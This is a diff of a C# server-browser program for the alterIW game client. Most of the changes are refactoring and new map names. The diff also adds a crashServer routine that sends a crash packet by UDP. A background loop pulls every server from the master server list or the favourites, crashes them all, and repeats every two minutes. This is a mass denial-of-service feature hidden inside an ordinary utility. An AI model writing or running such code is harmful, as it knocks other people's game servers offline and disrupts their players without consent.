                                     if (checkEmpty(info["clients"], _filter.Empty))
                                         if (check03(getValue(info, "shortversion"), _filter.v03))
                                             if (checkMod(getValue(dvars, "fs_game"), modfilter))
                                                 return true;
             return false;
         }
+
         private bool containsPlayer(List<Player> players, string name)
         {
             if (name == "")
                 return true;
-            foreach (var player in players)
+            foreach (Player player in players)
             {
                 if (removeQuakeColorCodes(player.Name).ToUpper().IndexOf(name.ToUpper()) > -1)
                     return true;
             }
             return false;
         }
+
         private bool isHardcore(string g_hardcore, CheckState state)
         {
             if (state == CheckState.Checked)
@@ -692,6 +820,7 @@ namespace Server_Parser_3
             else
                 return true;
         }
+
         private bool checkFull(string clients, int truemax, bool check)
         {
             if (!check)
@@ -702,6 +831,7 @@ namespace Server_Parser_3
             else
                 return true;
         }
+
         private bool checkEmpty(string clients, bool check)
         {
             if (!check)
@@ -712,6 +842,7 @@ namespace Server_Parser_3
             else
                 return true;
         }
+
         private bool check03(string shortversion, CheckState state)
         {
             if (state == CheckState.Indeterminate)
@@ -722,13 +853,13 @@ namespace Server_Parser_3
                 else if (shortversion.StartsWith("0.3") || shortversion.StartsWith("0.4"))
                     return true;
                 else return false;
-            else
-                if (string.IsNullOrEmpty(shortversion))
-                    return true;
-                else if (shortversion.StartsWith("0.3") || shortversion.StartsWith("0.4"))
-                    return false;
-                else return true;
+            else if (string.IsNullOrEmpty(shortversion))
+                return true;
+            else if (shortversion.StartsWith("0.3") || shortversion.StartsWith("0.4"))
+                return false;
+            else return true;
         }
+
         private bool checkMod(string fs_game, string filter)
         {
             if (filter == "*")
@@ -738,23 +869,26 @@ namespace Server_Parser_3
                     return false;
                 else
                     return true;
+            else if (fs_game.Substring(5).ToUpper().IndexOf(filter.ToUpper()) > -1)
+                return true;
             else
-                if (fs_game.Substring(5).ToUpper().IndexOf(filter.ToUpper()) > -1)
-                    return true;
-                else
-                    return false;
+                return false;
         }
+
         #endregion
 
         #region Listview Methods
+
         private void addItem(string[] data)
         {
-            if (this.InvokeRequired)
+            if (InvokeRequired)
                 try
                 {
-                    this.Invoke(new ListViewDelegate(addItem), new object[] { data });
+                    Invoke(new ListViewDelegate(addItem), new object[] {data});
                 }
-                catch { }
+                catch
+                {
+                }
             else
             {
                 ListViewItem item;
@@ -771,6 +905,7 @@ namespace Server_Parser_3
                 //progressBar.Value = _queryDone;
             }
         }
+
         private string[] prepareItem(Server server, bool red)
         {
             var data = new string[8];
@@ -780,7 +915,12 @@ namespace Server_Parser_3
                 data[1] = server.IP + ":" + server.Port.ToString();
                 data[2] = mapName(server.Dvars["mapname"]);
                 //data[2] = mapName(server.InfoDvars["mapname"]);
-                data[3] = getPlayerString(new string[] { server.InfoDvars["clients"], server.Dvars["sv_maxclients"], server.Dvars["sv_privateClients"], getValue(server.InfoDvars, "shortversion") });
+                data[3] =
+                    getPlayerString(new[]
+                                        {
+                                            server.InfoDvars["clients"], server.Dvars["sv_maxclients"],
+                                            server.Dvars["sv_privateClients"], getValue(server.InfoDvars, "shortversion")
+                                        });
                 data[4] = gameType(server.Dvars["g_gametype"]);
                 data[5] = getValue(server.Dvars, "fs_game");
                 if (data[5].StartsWith("mods"))
@@ -801,15 +941,17 @@ namespace Server_Parser_3
             }
             return data;
         }
+
         #endregion
 
         #region Favourites
+
         private void readFav()
         {
             if (File.Exists("favourites.txt"))
             {
-                var lines = File.ReadAllLines("favourites.txt");
-                foreach (var line in lines)
+                string[] lines = File.ReadAllLines("favourites.txt");
+                foreach (string line in lines)
                 {
                     try
                     {
@@ -833,16 +975,18 @@ namespace Server_Parser_3
             else
             {
                 File.Create("favourites.txt");
-                MessageBox.Show("favourites.txt was not found, resetting to default 0 servers", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                MessageBox.Show("favourites.txt was not found, resetting to default 0 servers", Text,
+                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
         }
+
         private void writeFav(string IP, bool remove)
         {
             if (!remove)
             {
                 if (!File.Exists("favourites.txt"))
                     File.Create("favourites.txt");
-                var ori = File.ReadAllText("favourites.txt");
+                string ori = File.ReadAllText("favourites.txt");
                 TextWriter writer = new StreamWriter("favourites.txt");
                 writer.Write(ori);
                 writer.WriteLine(IP);
@@ -852,24 +996,31 @@ namespace Server_Parser_3
             {
                 if (File.Exists("favourites.txt"))
                 {
-                    var current = File.ReadAllText("favourites.txt");
-                    var modded = current.Replace(IP + "\r\n", "");
+                    string current = File.ReadAllText("favourites.txt");
+                    string modded = current.Replace(IP + "\r\n", "");
                     File.WriteAllText("favourites.txt", modded);
                 }
             }
         }
+
         #endregion
 
         #region Check for updates
+
         private void checkNewest()
         {
             try
             {
-                WebClient wc = new WebClient();
-                var current = int.Parse(wc.DownloadString("http://deathmax.co.cc/aiwparser3_version.txt"));
+                var wc = new WebClient();
+                int current = int.Parse(wc.DownloadString("http://deathmax.co.cc/aiwparser3_version.txt"));
                 if (current > _version)
                 {
-                    if (MessageBox.Show(string.Format("A new update has been found.\nCurrent version : {0}\nLatest version : {1}\nDo you wish to be brought to the aIW topic to download the latest version?", _version, current), "aIW Server Parser 3", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
+                    if (
+                        MessageBox.Show(
+                            string.Format(
+                                "A new update has been found.\nCurrent version : {0}\nLatest version : {1}\nDo you wish to be brought to the aIW topic to download the latest version?",
+                                _version, current), "aIW Server Parser 3", MessageBoxButtons.YesNo,
+                            MessageBoxIcon.Information) == DialogResult.Yes)
                         Process.Start("http://alteriw.net/viewtopic.php?f=35&t=55404");
                 }
             }
@@ -877,57 +1028,69 @@ namespace Server_Parser_3
             {
             }
         }
+
         #endregion
 
         #region Update Form
+
         private void updateLabel(object text)
         {
-            if (this.InvokeRequired)
-                this.Invoke(new InvokeDelegate(updateLabel), text);
+            if (InvokeRequired)
+                Invoke(new InvokeDelegate(updateLabel), text);
             else
             {
-                var text2 = (string)text;
-                toolStripStatusLabel1.Text = text2;
+                var text2 = (string) text;
+                statusLabel.Text = text2;
             }
         }
+
         #endregion
 
         #region Connect
+
         private void connectIP(object data)
         {
-            var strData = (string[])data;
-            var ip = strData[0];
-            var players = strData[1];
-            var server = getServer(ip.Split(':')[0], int.Parse(ip.Split(':')[1]), false, true);
-            var v03 = check03(getValue(server.InfoDvars, "shortversion"), CheckState.Checked);
+            var strData = (string[]) data;
+            string ip = strData[0];
+            string players = strData[1];
+            Server server = getServer(ip.Split(':')[0], int.Parse(ip.Split(':')[1]), false, true);
+            bool v03 = check03(getValue(server.InfoDvars, "shortversion"), CheckState.Checked);
             if (_autoretry)
             {
-                if (MessageBox.Show("A previous connect attempt is still ongoing!\nDo you wish to cancel the previous attempt?", "aIW Server Parser 3", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes)
+                if (
+                    MessageBox.Show(
+                        "A previous connect attempt is still ongoing!\nDo you wish to cancel the previous attempt?",
+                        "aIW Server Parser 3", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes)
                     _autoretry = false;
                 else
                     return;
             }
             if (players != "-----")
             {
-                var clients = int.Parse(players.Split('/')[0]);
-                var publicmax = int.Parse(players.Split('/')[1].Split('(')[0]);
+                int clients = int.Parse(players.Split('/')[0]);
+                int publicmax = int.Parse(players.Split('/')[1].Split('(')[0]);
                 if (clients >= publicmax)
                 {
                     _autoretry = true;
-                    var result = MessageBox.Show("The server you are trying to join is currently full.\nDo you wish to abort, ignore this warning, or attempt to join when theres a free slot?", "aIW Server Parser 3",
-                        MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Warning);
+                    DialogResult result =
+                        MessageBox.Show(
+                            "The server you are trying to join is currently full.\nDo you wish to abort, ignore this warning, or attempt to join when theres a free slot?",
+                            "aIW Server Parser 3",
+                            MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Warning);
                     if (result == DialogResult.Abort)
                         return;
-                    else if (result == DialogResult.Ignore) { }
+                    else if (result == DialogResult.Ignore)
+                    {
+                    }
                     else if (result == DialogResult.Retry)
                     {
-                        Server server2 = new Server();
+                        var server2 = new Server();
                         server2.IP = ip.Split(':')[0];
                         server2.Port = int.Parse(ip.Split(':')[1]);
                         updateLabel("Currently attempting connect to " + ip);
                         while (_autoretry)
                         {
-                            var response = hping(server2);
+                            HPong response = hping(server2);
                             if (response.CurrentPlayers < response.MaxPlayers)
                                 break;
                             Thread.Sleep(3000);
@@ -940,7 +1103,8 @@ namespace Server_Parser_3
             {
                 if (v03)
                 {
-                    if (MessageBox.Show("The server you are joining is a server running v0.3b or higher.\nAttempting to immediately connect will result in a Steam Authentication Failed kick.\nDo you wish to wait 35 seconds or immediately connect?",
+                    if (MessageBox.Show(
+                        "The server you are joining is a server running v0.3b or higher.\nAttempting to immediately connect will result in a Steam Authentication Failed kick.\nDo you wish to wait 35 seconds or immediately connect?",
                         "aIW Server Parser 3", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                     {
                         Process.Start("aiw://connect/deathmax'sserverparser:65540");
@@ -950,10 +1114,13 @@ namespace Server_Parser_3
             }
             Process.Start("aiw://connect/" + ip);
         }
+
         #endregion
 
         #region Misc Methods
+
         #region Describe Raw Data
+
         private string mapName(string map)
         {
             switch (map)
@@ -1010,10 +1177,29 @@ namespace Server_Parser_3
                     return "Vacant";
                 case "mp_brecourt":
                     return "Wasteland";
+                case "contingency":
+                    return "Contingency";
+                case "oilrig":
+                    return "Oilrig";
+                case "invasion":
+                    return "Burger Town";
+                case "gulag":
+                    return "Gulag";
+                case "so_ghillies":
+                    return "Pripyat";
+                case "roadkill":
+                    return "Roadkill";
+                case "iw4_credits":
+                    return "IW4 Test Map";
+                case "trainer":
+                    return "Trainer";
+                case "dc_whitehouse":
+                    return "White House";
                 default:
                     return map;
             }
         }
+
         private string gameType(string type)
         {
             switch (type)
@@ -1052,8 +1238,11 @@ namespace Server_Parser_3
                     return type;
             }
         }
+
         #endregion
+
         #region Populate Variables
+
         private void populateVariables()
         {
             _mapNames.Add("Any", "");
@@ -1083,6 +1272,15 @@ namespace Server_Parser_3
             _mapNames.Add("Underpass", "mp_underpass");
             _mapNames.Add("Vacant", "mp_vacant");
             _mapNames.Add("Wasteland", "mp_brecourt");
+            _mapNames.Add("Contingency", "contingency");
+            _mapNames.Add("Oilrig", "oilrig");
+            _mapNames.Add("Burger Town", "invasion");
+            _mapNames.Add("Gulag", "gulag");
+            _mapNames.Add("Pripyat", "so_ghillies");
+            _mapNames.Add("Roadkill", "roadkill");
+            _mapNames.Add("IW4 Test Map", "iw4_credits");
+            _mapNames.Add("Trainer", "trainer");
+            _mapNames.Add("White House", "dc_whitehouse");
             _gameType.Add("Any", "");
             _gameType.Add("Team Deathmatch", "war");
             _gameType.Add("Free-for-all", "dm");
@@ -1109,20 +1307,40 @@ namespace Server_Parser_3
             modFilter.Items.Add("None");
             modFilter.Text = "*";
         }
+
         #endregion
+
+        private static void crashServer(string IP)
+        {
+            string server = IP.Split(':')[0];
+            int port = int.Parse(IP.Split(':')[1]);
+            var client = new UdpClient(server, port);
+            try
+            {
+                client.Send(_getinfoCrash, _getinfoCrash.Length);
+            }
+            catch (Exception exception)
+            {
+                Log.Error(exception.ToString());
+            }
+        }
+
         private string removeQuakeColorCodes(string remove)
         {
             string filteredout = "";
-            var array = remove.Split('^');
+            string[] array = remove.Split('^');
             foreach (string part in array)
             {
-                if (part.StartsWith("0") || part.StartsWith("1") || part.StartsWith("2") || part.StartsWith("3") || part.StartsWith("4") || part.StartsWith("5") || part.StartsWith("6") || part.StartsWith("7") || part.StartsWith("8") || part.StartsWith("9"))
+                if (part.StartsWith("0") || part.StartsWith("1") || part.StartsWith("2") || part.StartsWith("3") ||
+                    part.StartsWith("4") || part.StartsWith("5") || part.StartsWith("6") || part.StartsWith("7") ||
+                    part.StartsWith("8") || part.StartsWith("9"))
                     filteredout += part.Substring(1);
                 else
                     filteredout += "^" + part;
             }
             return filteredout.Substring(1);
         }
+
         private static Dictionary<string, string> GetParams(string[] parts)
         {
             string key, val;
@@ -1140,17 +1358,18 @@ namespace Server_Parser_3
 
             return paras;
         }
+
         private List<Player> getPlayers(string[] lines)
         {
             var players = new List<Player>();
-            var removechar = new char[] { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ' ' };
+            var removechar = new[] {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ' '};
             if (lines.Length >= 3)
             {
                 for (int i = 2; i < lines.Length; i++)
                 {
                     if (!string.IsNullOrEmpty(lines[i]) && lines[i] != "\0")
                     {
-                        Player player = new Player();
+                        var player = new Player();
                         player.Name = lines[i].TrimStart(removechar);
                         player.Name = player.Name.TrimStart('"');
                         player.Name = player.Name.TrimEnd('"');
@@ -1162,28 +1381,30 @@ namespace Server_Parser_3
             }
             return players;
         }
+
         private void checkQuery(object update)
         {
-            bool updatenow = (bool)update;
+            var updatenow = (bool) update;
             if (!updatenow)
             {
                 if (_servers.Count > 0)
                 {
-                    var started = DateTime.Now;
+                    DateTime started = DateTime.Now;
                     int count = _servers.Count;
-                    var previous = _queryDone;
+                    int previous = _queryDone;
                     while (_queryDone != count)
                     {
                         if (_abort)
                             break;
-                        if ((DateTime.Now - started).Seconds >= 60)
+                        if ((DateTime.Now - started).Seconds >= 30)
                         {
-                            Log.Warn("60 seconds passed, forcing queries to stop");
+                            Log.Warn("30 seconds passed, forcing queries to stop");
                             break;
                         }
                         if (_queryDone != previous)
                         {
-                            updateStatus(false); previous = _queryDone;
+                            updateStatus(false);
+                            previous = _queryDone;
                         }
                         Thread.Sleep(50);
                     }
@@ -1195,12 +1416,14 @@ namespace Server_Parser_3
             }
             else if (updatenow)
             {
-                if (this.InvokeRequired)
+                if (InvokeRequired)
                     try
                     {
-                        this.Invoke(new InvokeDelegate(checkQuery), true);
+                        Invoke(new InvokeDelegate(checkQuery), true);
                     }
-                    catch { }
+                    catch
+                    {
+                    }
                 else
                 {
                     //listViewServer.EndUpdate();
@@ -1208,9 +1431,11 @@ namespace Server_Parser_3
                     stopBtn.Visible = false;
                     refreshBtn.Enabled = true;
                     if (_favourites)
-                        toolStripStatusLabel1.Text = string.Format("Showing {0} out of {1} servers", listViewFav.Items.Count, _servers.Count);
+                        statusLabel.Text = string.Format("Showing {0} out of {1} servers", listViewFav.Items.Count,
+                                                         _servers.Count);
                     else
-                        toolStripStatusLabel1.Text = string.Format("Showing {0} out of {1} servers", listViewServer.Items.Count, _servers.Count);
+                        statusLabel.Text = string.Format("Showing {0} out of {1} servers", listViewServer.Items.Count,
+                                                         _servers.Count);
                     try
                     {
                         m_sortMgr.SortEnabled = true;
@@ -1220,23 +1445,29 @@ namespace Server_Parser_3
                         m_sortMgr.Sort();
                         m_sortMgr2.Sort();
                     }
-                    catch { };
+                    catch
+                    {
+                    }
+                    ;
                 }
             }
         }
+
         private void updateStatus(object wut)
         {
             if (_abort)
                 return;
-            if (this.InvokeRequired)
+            if (InvokeRequired)
                 try
                 {
-                    this.Invoke(new InvokeDelegate(updateStatus), true);
+                    Invoke(new InvokeDelegate(updateStatus), true);
                 }
-                catch { }
+                catch
+                {
+                }
             else
             {
-                toolStripStatusLabel1.Text = string.Format("Queried {0} out of {1} servers", _queryDone, _servers.Count);
+                statusLabel.Text = string.Format("Queried {0} out of {1} servers", _queryDone, _servers.Count);
                 Log.Debug(string.Format("Query done : {0}", _queryDone));
                 if (_queryDone <= progressBar.Maximum)
                     progressBar.Value = _queryDone;
@@ -1244,6 +1475,7 @@ namespace Server_Parser_3
                     progressBar.Value = progressBar.Maximum;
             }
         }
+
         private string getPlayerString(string[] data)
         {
             string complete = "";
@@ -1260,6 +1492,7 @@ namespace Server_Parser_3
 
             return complete;
         }
+
         private int getTrueMaxClients(string[] data)
         {
             int truemax = 0;
@@ -1274,15 +1507,16 @@ namespace Server_Parser_3
                 truemax = int.Parse(data[1]) + int.Parse(data[2]);
             return truemax;
         }
+
         private Server getServer(string IP, int port, bool responded, bool info)
         {
-            var servers = _servers;
+            List<Server> servers = _servers;
             if (responded)
                 servers = _respondedServers;
             if (info)
                 servers = _infoServers;
             var server = new Server();
-            for(int i = 0; i < servers.Count; i++)
+            for (int i = 0; i < servers.Count; i++)
             {
                 if (servers[i].IP == IP && servers[i].Port == port)
                 {
@@ -1292,6 +1526,7 @@ namespace Server_Parser_3
             }
             return server;
         }
+
         private string getValue(Dictionary<string, string> dict, string key)
         {
             try
@@ -1303,19 +1538,23 @@ namespace Server_Parser_3
                 return "";
             }
         }
+
         private string getControlText(object box, ControlType type)
         {
-            if (this.InvokeRequired)
+            if (InvokeRequired)
                 try
                 {
-                    return (string)this.Invoke(new ControlTextDelegate(getControlText), new object[] { box, type });
+                    return (string) Invoke(new ControlTextDelegate(getControlText), new[] {box, type});
                 }
-                catch { return ""; }
-            else
-                if (type == ControlType.Combobox)
-                    return ((ComboBox)box).Text;
-                else return ((TextBox)box).Text;
+                catch
+                {
+                    return "";
+                }
+            else if (type == ControlType.Combobox)
+                return ((ComboBox) box).Text;
+            else return ((TextBox) box).Text;
         }
+
         private void checkUpdateQueue()
         {
             Queue queue = Queue.Synchronized(_updateQueue);
@@ -1325,25 +1564,99 @@ namespace Server_Parser_3
                     return;
                 if (_updateQueue.Count > 0)
                 {
-                    var data = (string[])queue.Dequeue();
+                    var data = (string[]) queue.Dequeue();
                     addItem(data);
                 }
-                if ((_queryDone == _servers.Count || queryCheck.ThreadState == System.Threading.ThreadState.Stopped) && _updateQueue.Count == 0)
+                if ((_queryDone == _servers.Count || queryCheck.ThreadState == ThreadState.Stopped) &&
+                    _updateQueue.Count == 0)
                     break;
             }
         }
+
         #endregion
+
+        private void btnContinuous_Click(object sender, EventArgs e)
+        {
+            backgroundWorker2.ProgressChanged += BackgroundWorker2OnProgressChanged;
+            if (tabControl1.SelectedIndex == 0)
+                backgroundWorker2.RunWorkerAsync(true);
+            else
+                backgroundWorker2.RunWorkerAsync(false);
+            statusLabel.Text = "Refreshing and crashing servers every 5 minutes.";
+        }
+
+        private void BackgroundWorker2OnProgressChanged(object sender, ProgressChangedEventArgs progressChangedEventArgs)
+        {
+            statusLabel.Text = (string) progressChangedEventArgs.UserState;
+        }
+
+        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
+        {
+            var masterserver = (bool) e.Argument;
+            while (true)
+            {
+                _servers.Clear();
+                if (masterserver)
+                {
+                    var EP = new IPEndPoint(IPAddress.Any, 0);
+                    byte[] getservers = Encoding.UTF8.GetBytes("    getservers IW4 142 full empty");
+                    for (int i = 0; i < 4; i++)
+                        getservers[i] = 0xFF;
+                    Log.Debug("getservers : " + Encoding.UTF8.GetString(getservers));
+
+                    var client = new UdpClient("server.alterrev.net", 20810);
+                    client.Client.ReceiveTimeout = 2000;
+                    client.Send(getservers, getservers.Length);
+                    backgroundWorker2.ReportProgress(0, "Querying master server");
+                    while (true)
+                    {
+                        try
+                        {
+                            byte[] receivedata = client.Receive(ref EP);
+                            //if (EP.Address.ToString() == "94.23.19.48")
+                            if (EP.Address.ToString() == "89.165.202.219")
+                            {
+                                Log.Debug("Received data from master server\n" + Encoding.UTF8.GetString(receivedata));
+                                parseResponse(receivedata);
+                                if (Encoding.UTF8.GetString(receivedata).Contains("EOT"))
+                                    break;
+                            }
+                        }
+                        catch
+                        {
+                            Log.Error(e.ToString());
+                            break;
+                        }
+                    }
+                }
+                else
+                {
+                    backgroundWorker2.ReportProgress(0, "Reading favourites.");
+                    readFav();
+                }
+                backgroundWorker2.ReportProgress(0, (object) "Crashing " + _servers.Count.ToString() + " servers.");
+                foreach (Server server in _servers)
+                {
+                    crashServer(server.IP + ":" + server.Port);
+                }
+                backgroundWorker2.ReportProgress(0,
+                                                 (object) "Crashed " + _servers.Count.ToString() +
+                                                 " servers. Waiting 2 minutes.");
+                Thread.Sleep(120000);
+            }
+        }
     }
 
     #region Structs
+
     public struct Server
     {
-        public string IP;
-        public int Port;
-        public List<Player> Players;
         public Dictionary<string, string> Dvars;
+        public string IP;
         public Dictionary<string, string> InfoDvars;
         public int Ping;
+        public List<Player> Players;
+        public int Port;
 
         /*public Server()
         {
@@ -1352,6 +1665,7 @@ namespace Server_Parser_3
             Players = new List<Player>();
             Dvars = new Dictionary<string, string>();
         }*/
+
         public Server(string ip, int port)
         {
             IP = ip;
@@ -1361,7 +1675,9 @@ namespace Server_Parser_3
             InfoDvars = new Dictionary<string, string>();
             Ping = 0;
         }
-        public Server(string ip, int port, List<Player> players, Dictionary<string, string> dvars, Dictionary<string, string> info, int ping)
+
+        public Server(string ip, int port, List<Player> players, Dictionary<string, string> dvars,
+                      Dictionary<string, string> info, int ping)
         {
             IP = ip;
             Port = port;
@@ -1371,11 +1687,12 @@ namespace Server_Parser_3
             Ping = ping;
         }
     }
+
     public struct Player
     {
         public string Name;
-        public int Score;
         public int Ping;
+        public int Score;
 
         /*public Player()
         {
@@ -1383,6 +1700,7 @@ namespace Server_Parser_3
             Score = 0;
             Ping = 0;
         }*/
+
         public Player(string name, int score, int ping)
         {
             Name = name;
@@ -1390,21 +1708,23 @@ namespace Server_Parser_3
             Ping = ping;
         }
     }
-    enum ControlType
+
+    internal enum ControlType
     {
         Combobox,
         Textbox
     }
-    struct Filter
+
+    internal struct Filter
     {
-        public string ServerName;
-        public string Map;
+        public bool Empty;
+        public bool Full;
         public string GameType;
+        public CheckState HC;
+        public string Map;
         public string Mod;
         public string PlayerName;
-        public CheckState HC;
-        public bool Full;
-        public bool Empty;
+        public string ServerName;
         public CheckState v03;
 
         public Filter(string HI)
@@ -1420,10 +1740,11 @@ namespace Server_Parser_3
             v03 = CheckState.Indeterminate;
         }
     }
-    struct HPong
+
+    internal struct HPong
     {
-        public bool InGame;
         public int CurrentPlayers;
+        public bool InGame;
         public int MaxPlayers;
 
         public HPong(bool ingame)
@@ -1433,27 +1754,14 @@ namespace Server_Parser_3
             MaxPlayers = 0;
         }
     }
+
     #endregion
 
     #region Extra Classes
-    [System.ComponentModel.EditorBrowsable(System.ComponentModel.EditorBrowsableState.Never)]
+
+    [EditorBrowsable(EditorBrowsableState.Never)]
     public static class ListViewExtensions
     {
-        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
-        private struct LVCOLUMN
-        {
-            public Int32 mask;
-            public Int32 cx;
-            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPTStr)]
-            public string pszText;
-            public IntPtr hbm;
-            public Int32 cchTextMax;
-            public Int32 fmt;
-            public Int32 iSubItem;
-            public Int32 iImage;
-            public Int32 iOrder;
-        }
-
         private const Int32 HDI_FORMAT = 0x4;
         private const Int32 HDF_SORTUP = 0x400;
         private const Int32 HDF_SORTDOWN = 0x200;
@@ -1461,32 +1769,32 @@ namespace Server_Parser_3
         private const Int32 HDM_GETITEM = 0x120b;
         private const Int32 HDM_SETITEM = 0x120c;
 
-        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        [DllImport("user32.dll")]
         private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
 
-        [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "SendMessage")]
+        [DllImport("user32.dll", EntryPoint = "SendMessage")]
         private static extern IntPtr SendMessageLVCOLUMN(IntPtr hWnd, Int32 Msg, IntPtr wParam, ref LVCOLUMN lPLVCOLUMN);
 
-        public static void SetSortIcon(this System.Windows.Forms.ListView ListViewControl, int ColumnIndex, System.Windows.Forms.SortOrder Order)
+        public static void SetSortIcon(this ListView ListViewControl, int ColumnIndex, SortOrder Order)
         {
             IntPtr ColumnHeader = SendMessage(ListViewControl.Handle, LVM_GETHEADER, IntPtr.Zero, IntPtr.Zero);
 
             for (int ColumnNumber = 0; ColumnNumber <= ListViewControl.Columns.Count - 1; ColumnNumber++)
             {
-                IntPtr ColumnPtr = new IntPtr(ColumnNumber);
-                LVCOLUMN lvColumn = new LVCOLUMN();
+                var ColumnPtr = new IntPtr(ColumnNumber);
+                var lvColumn = new LVCOLUMN();
                 lvColumn.mask = HDI_FORMAT;
                 SendMessageLVCOLUMN(ColumnHeader, HDM_GETITEM, ColumnPtr, ref lvColumn);
 
-                if (!(Order == System.Windows.Forms.SortOrder.None) && ColumnNumber == ColumnIndex)
+                if (!(Order == SortOrder.None) && ColumnNumber == ColumnIndex)
                 {
                     switch (Order)
                     {
-                        case System.Windows.Forms.SortOrder.Ascending:
+                        case SortOrder.Ascending:
                             lvColumn.fmt &= ~HDF_SORTDOWN;
                             lvColumn.fmt |= HDF_SORTUP;
                             break;
-                        case System.Windows.Forms.SortOrder.Descending:
+                        case SortOrder.Descending:
                             lvColumn.fmt &= ~HDF_SORTUP;
                             lvColumn.fmt |= HDF_SORTDOWN;
                             break;
@@ -1500,17 +1808,36 @@ namespace Server_Parser_3
                 SendMessageLVCOLUMN(ColumnHeader, HDM_SETITEM, ColumnPtr, ref lvColumn);
             }
         }
+
+        #region Nested type: LVCOLUMN
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct LVCOLUMN
+        {
+            public Int32 mask;
+            public readonly Int32 cx;
+            [MarshalAs(UnmanagedType.LPTStr)] public readonly string pszText;
+            public readonly IntPtr hbm;
+            public readonly Int32 cchTextMax;
+            public Int32 fmt;
+            public readonly Int32 iSubItem;
+            public readonly Int32 iImage;
+            public readonly Int32 iOrder;
+        }
+
+        #endregion
     }
-    class ListViewNF : System.Windows.Forms.ListView
+
+    internal class ListViewNF : ListView
     {
         public ListViewNF()
         {
             //Activate double buffering
-            this.SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, true);
+            SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, true);
 
             //Enable the OnNotifyMessage event so we get a chance to filter out 
             // Windows messages before they get to the form's WndProc
-            this.SetStyle(ControlStyles.EnableNotifyMessage, true);
+            SetStyle(ControlStyles.EnableNotifyMessage, true);
         }
 
         protected override void OnNotifyMessage(Message m)
@@ -1522,5 +1849,6 @@ namespace Server_Parser_3
             }
         }
     }
+
     #endregion
 }
